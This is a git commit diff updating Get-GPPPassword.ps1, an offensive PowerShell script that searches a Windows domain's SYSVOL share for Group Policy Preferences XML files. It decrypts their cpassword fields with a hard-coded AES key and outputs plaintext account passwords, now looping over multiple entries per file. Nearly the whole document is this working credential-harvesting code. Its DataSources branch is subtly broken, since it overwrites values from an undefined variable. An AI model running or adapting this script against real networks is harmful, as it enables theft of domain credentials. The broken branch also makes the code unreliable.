9435ef99c0988e6dc362e3f869da5a221dbcc64d
Warai-Otoko <caddberry@gmail.com>
2013-08-22 15:59:44 -0500

    Update Get-GPPPassword.ps1
    The original script couldn't deal with multiple objects contained within the XML, e.g., one policy setting passwords for 2 user accounts. I've updated the script so that it handles these situations properly. Also made a few other minor changes: hashtable order, and general formatting.
    
    I've never live edited a script prior to this and hadn't planned on submitting it like this. The changes in formatting we're really only my preference to make it easier for me to read. 
    
    My apologies if that's frowned upon as I never intended to make this public to anyone other than the author.

--- Exfiltration/Get-GPPPassword.ps1
+++ Exfiltration/Get-GPPPassword.ps1
@@ -1,4 +1,4 @@
-﻿function Get-GPPPassword {
+function Get-GPPPassword {
 <#
 .SYNOPSIS
 
@@ -9,7 +9,7 @@
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
- 
+    
 .DESCRIPTION
 
     Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.
@@ -26,112 +26,177 @@
     http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
 #>
     
-    [CmdletBinding()]
-    Param ()
+[CmdletBinding()]
+Param ()
     
-    #define helper function that decodes and decrypts password
-    function Get-DecryptedCpassword {
-        Param (
-            [string] $Cpassword 
-        )
+#define helper function that decodes and decrypts password
+function Get-DecryptedCpassword {
+    Param (
+        [string] $Cpassword 
+    )
 
-        try {
-            #Append appropriate padding based on string length  
-            $Mod = ($Cpassword.length % 4)
-            if ($Mod -ne 0) {$Cpassword += ('=' * (4 - $Mod))}
-
-            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
-            
-            #Create a new AES .NET Crypto Object
-            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
-            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
-                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
-            
-            #Set IV to all nulls to prevent dynamic generation of IV value
-            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
-            $AesObject.IV = $AesIV
-            $AesObject.Key = $AesKey
-            $DecryptorObject = $AesObject.CreateDecryptor() 
-            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
-            
-            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
-        } 
-        
-        catch {Write-Error $Error[0]}
-    }  
-    
-    #ensure that machine is domain joined and script is running as a domain account
-    if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) )
+    try 
     {
-        throw 'Machine is not joined to a domain.'
-    }
+        #Append appropriate padding based on string length  
+        $Mod = ($Cpassword.length % 4)
+        if ($Mod -ne 0) {$Cpassword += ('=' * (4 - $Mod))}
+
+        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
+            
+        #Create a new AES .NET Crypto Object
+        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
+                                0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
+            
+        #Set IV to all nulls to prevent dynamic generation of IV value
+        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
+        $AesObject.IV = $AesIV
+        $AesObject.Key = $AesKey
+        $DecryptorObject = $AesObject.CreateDecryptor() 
+        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
+            
+        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
+    } 
+        
+    catch {Write-Error $Error[0]}
+}  
     
-    #discover potential files containing passwords ; not complaining in case of denied access to a directory
-    $XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml'
+#ensure that machine is domain joined and script is running as a domain account
+if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) )
+{
+    throw 'Machine is not joined to a domain.'
+}
     
-    if ( -not $XMlFiles )
+#discover potential files containing passwords ; not complaining in case of denied access to a directory
+$XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml'
+    
+if ( -not $XMlFiles )
+{
+    throw 'No files containing encrypted passwords found.'
+}
+
+foreach ($File in $XMLFiles) 
+{
+    try 
     {
-        throw 'No files containing encrypted passwords found.'
-    }
+        $Filename = $File.Name
+        $Filepath = $File.VersionInfo.FileName
 
-    foreach ($File in $XMLFiles) {
-        
-        try {
-            $Filename = $File.Name
-            $Filepath = $File.VersionInfo.FileName
+        #put filename in $XmlFile
+        [xml] $Xml = Get-Content ($File)
 
-            #put filename in $XmlFile
-            [xml] $Xml = Get-Content ($File)
-
-            #declare blank variables
-            $Cpassword = ''
-            $UserName = ''
-            $NewName = ''
-            $Changed = ''
-    
-            switch ($Filename) {
-
-                'Groups.xml' {
-                    $Cpassword = $Xml.Groups.User.Properties.cpassword
-                    $UserName = $Xml.Groups.User.Properties.userName
-                    $NewName = $Xml.Groups.User.Properties.newName
-                    $Changed = $Xml.Groups.User.changed
+        #declare blank variables
+        $Cpassword = ''
+        $UserName = ''
+        $NewName = ''
+        $Changed = ''
+       
+        switch ($Filename) 
+        {
+            'Groups.xml' 
+            { # In the instance of multiple objects returned dump them into a foreach
+                foreach ($obj in $Xml.Groups.User)
+                {
+                    $Cpassword = $obj.Properties.cpassword
+                    $UserName = $obj.Properties.userName
+                    $Name = $obj.name
+                    $NewName = $obj.Properties.newName
+                    $Changed = $obj.changed
+                    if ($Cpassword) 
+                    {
+                            $Password = Get-DecryptedCpassword $Cpassword
+                            $ObjectProperties = [ordered]@{'Name' = $Name; # Pulling .name gives better results than .userName
+                                            'Password' = $Password;
+                                            'Changed' = $Changed;
+                                            'NewName' = $NewName;
+                                            'File' = $Filepath}
+                            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
+                            Write-Output $ResultsObject
+                    }
+                        else 
+                        {
+                            Write-Verbose "No encrypted passwords found in $Filepath"
+                        }
                 }
+            }
         
-                'Services.xml' {
-                    $Cpassword = $Xml.NTServices.NTService.Properties.cpassword
-                    $UserName = $Xml.NTServices.NTService.Properties.accountName
-                    $Changed = $Xml.NTServices.NTService.changed
-                }
-        
-                'Scheduledtasks.xml' {
-                    $Cpassword = $Xml.ScheduledTasks.Task.Properties.cpassword
-                    $UserName = $Xml.ScheduledTasks.Task.Properties.runAs
-                    $Changed = $Xml.ScheduledTasks.Task.changed
-                }
-        
-                'DataSources.xml' {
-                    $Cpassword = $Xml.DataSources.DataSource.Properties.cpassword
-                    $UserName = $Xml.DataSources.DataSource.Properties.username
-                    $Changed = $Xml.DataSources.DataSource.changed
+            'Services.xml' 
+            {
+                foreach ($obj in $Xml.NTServices.NTService)
+                {
+                    $Cpassword = $obj.Properties.cpassword
+                    $UserName = $obj.Properties.accountName
+                    $Changed = $obj.changed
+                    if ($Cpassword) 
+                    {
+                            $password = Get-DecryptedCpassword $Cpassword
+                            $ObjectProperties = @{'Password' = $Password;
+                                            'UserName' = $UserName;
+                                            'Changed' = $Changed;
+                                            'File' = $Filepath}
+                            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
+                            Write-Output $ResultsObject
+                    }
+                        else 
+                        {
+                            Write-Verbose "No encrypted passwords found in $Filepath"
+                        }
                 }
             }
 
-            if ($Cpassword) {$Password = Get-DecryptedCpassword $Cpassword}
-
-            else {Write-Verbose "No encrypted passwords found in $Filepath"}
-        
-            #Create custom object to output results
-            $ObjectProperties = @{'Password' = $Password;
-                                  'UserName' = $UserName;
-                                  'Changed' = $Changed;
-                                  'NewName' = $NewName
-                                  'File' = $Filepath}
-                
-            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
-            Write-Output $ResultsObject
+            'Scheduledtasks.xml' 
+            {
+                Foreach ($obj in $XML.ScheduledTasks.Task)
+                {
+                    $Cpassword = $obj.Properties.cpassword
+                    $UserName = $obj.Properties.runAs
+                    $Changed = $obj.changed
+                    if ($Cpassword) 
+                    {
+                            $password = Get-DecryptedCpassword $Cpassword
+                            $ObjectProperties = @{'Password' = $Password;
+                                            'UserName' = $UserName;
+                                            'Changed' = $Changed;
+                                            'File' = $Filepath}
+                            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
+                            Write-Output $ResultsObject
+                    }
+                        else 
+                        {
+                            Write-Verbose "No encrypted passwords found in $Filepath"
+                        }
+                }
+            }
+            
+            'DataSources.xml' 
+            {
+                Foreach ($obj in $xml.datasources.datasource)
+                {
+                    $Cpassword = $obj.Properties.cpassword
+                    $UserName = $obj.Properties.username
+                    $Changed = $obj.changed
+                    if ($Cpassword) 
+                    {
+                            $Cpassword = $usr.Properties.cpassword
+                            $UserName = $usr.Properties.username
+                            $Changed = $usr.changed
+                            $password = Get-DecryptedCpassword $Cpassword
+                            $ObjectProperties = @{'Password' = $Password;
+                                            'UserName' = $UserName;
+                                            'Changed' = $Changed;
+                                            'File' = $Filepath}
+                            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
+                            Write-Output $ResultsObject
+                    }
+                        else 
+                        {
+                            Write-Verbose "No encrypted passwords found in $Filepath"
+                        }
+                }
+            }
         }
-        
-        catch {Write-Error $Error[0]}  
-    }
+    } 
+              
+    catch {Write-Error $Error[0]}  
+}
 }
